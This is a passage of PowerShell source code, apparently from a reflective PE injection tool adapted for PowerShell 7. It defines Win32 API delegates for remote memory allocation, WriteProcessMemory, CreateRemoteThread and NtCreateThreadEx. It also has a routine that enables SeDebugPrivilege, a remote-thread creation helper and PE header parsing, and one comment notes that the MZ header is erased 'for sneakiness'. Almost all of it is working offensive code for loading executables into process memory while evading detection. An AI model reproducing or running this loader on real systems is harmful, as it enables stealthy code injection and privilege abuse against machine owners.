        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
        
        return $Win32Constants
    }

    Function Get-Win32Functions
    {
        $Win32Functions = New-Object System.Object
        
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
        
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
        
        $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
        $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
        
        $memsetAddr = Get-ProcAddress msvcrt.dll memset
        $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
        
        $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
        $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
        $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
        
        $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
        
        $GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
        $GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        $GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
        
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
        
        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
        
        $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
        
        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
        $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
        $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
        
        $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
        $FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
        $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
        
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
        
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
        
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
        
        $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
        
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
        
        $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
        
        $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
        
        $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
        
        $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
        
        $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
        
        $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
        
        # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
            $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
        
        $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
        
        $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
        
        return $Win32Functions
    }
    #####################################

            
    #####################################
    ########### HELPERS ############
    #####################################

    #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
    #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
    Function Sub-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                $Val = $Value1Bytes[$i] - $CarryOver
                #Sub bytes
                if ($Val -lt $Value2Bytes[$i])
                {
                    $Val += 256
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
                
                
                [UInt16]$Sum = $Val - $Value2Bytes[$i]

                $FinalBytes[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Add-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                #Add bytes
                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

                $FinalBytes[$i] = $Sum -band 0x00FF
                
                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Compare-Val1GreaterThanVal2AsUInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
            {
                if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
                {
                    return $true
                }
                elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }
        
        return $false
    }
    

    Function Convert-UIntToInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )
        
        [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($ValueBytes, 0))
    }


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
    
    
    Function Test-MemoryRangeValid
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DebugString,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )
        
        [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
        
        $PEEndAddress = $PEInfo.EndAddress
        
        if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $DebugString"
        }
        if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $DebugString"
        }
    }
    
    
    Function Write-BytesToMemory
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,
            
            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $MemoryAddress
        )
    
        for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
        }
    }
    

    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        ################################################################################################
        #                              ADAPTED TO PS7	                                               #
        ################################################################################################
        $AssemblyBuilder = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, 'Run')
        #$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        ################################################################################################
        #                              END ADAPTED TO PS7	                                       #
        ################################################################################################
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }


    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        ################################################################################################
        #                              ADAPTED TO PS7	                                               #
        ################################################################################################
        #$SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            #Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $SystemAssembly=[Reflection.Assembly]::LoadFile('C:\windows\Microsoft.NET\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\system.dll')
        ################################################################################################
        #                              END ADAPTED TO PS7                                              #
        ################################################################################################
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }
    
    
    Function Enable-SeDebugPrivilege
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
        if ($ThreadHandle -eq [IntPtr]::Zero)
        {
            Throw "Unable to get the handle to the current thread"
        }
        
        [IntPtr]$ThreadToken = [IntPtr]::Zero
        [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        if ($Result -eq $false)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
            {
                $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
                if ($Result -eq $false)
                {
                    Throw "Unable to impersonate self"
                }
                
                $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                if ($Result -eq $false)
                {
                    Throw "Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
            }
        }
        
        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
        $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
        if ($Result -eq $false)
        {
            Throw "Unable to call LookupPrivilegeValue"
        }

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
        [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
        $TokenPrivileges.PrivilegeCount = 1
        $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
        $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

        $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
        if (($Result -eq $false) -or ($ErrorCode -ne 0))
        {
            #Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode" #todo need to detect if already set
        }
        
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
    }
    
    
    Function Create-RemoteThread
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $ProcessHandle,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $ArgumentPtr = [IntPtr]::Zero,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $Win32Functions
        )
        
        [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
        
        $OSVersion = [Environment]::OSVersion.Version
        #Vista and Win7
        if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
        {
            #Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
            $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($RemoteThreadHandle -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
            }
        }
        #XP/Win8
        else
        {
            #Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
            $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
        }
        
        if ($RemoteThreadHandle -eq [IntPtr]::Zero)
        {
            Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
        }
        
        return $RemoteThreadHandle
    }

    

    Function Get-ImageNtHeaders
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $NtHeadersInfo = New-Object System.Object
        
        #Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
        $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

        #Get IMAGE_NT_HEADERS
        [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
        $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
        $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
        
        #Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
        if ($imageNtHeaders64.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }
        
        if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }
        
        return $NtHeadersInfo
    }


    #This function will get the information needed to allocated space in memory for the PE
    Function Get-PEBasicInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $PEInfo = New-Object System.Object
        
        #Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
        [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
        
        #Get NtHeadersInfo
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
        
        #Build a structure with the information which will be needed for allocating memory and writing the PE to memory
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
